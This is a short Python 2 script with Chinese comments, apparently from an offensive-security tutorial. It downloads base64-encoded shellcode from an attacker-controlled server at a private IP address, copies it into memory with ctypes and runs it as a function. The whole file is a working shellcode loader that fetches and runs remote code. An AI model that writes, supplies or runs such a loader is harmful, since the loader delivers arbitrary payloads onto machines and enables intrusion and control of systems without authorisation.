#-*- coding:utf8 -*-  
  
import  urllib2  
import  ctypes  
import  base64  
  
# 從我們搭建的服務器下下載shellcode  
url =  "http://192.168.40.138:8000/shellcode.bin"  
response = urllib2.urlopen(url)  
  
# 解碼shellcode  -> base64
shellcode = base64.b64decode(response.read())  
# 在記憶體內配置暫存區  
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))  
# 建立函式指標指向shellcode  
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))  
# 呼叫我們的shellcode  
shellcode_func() 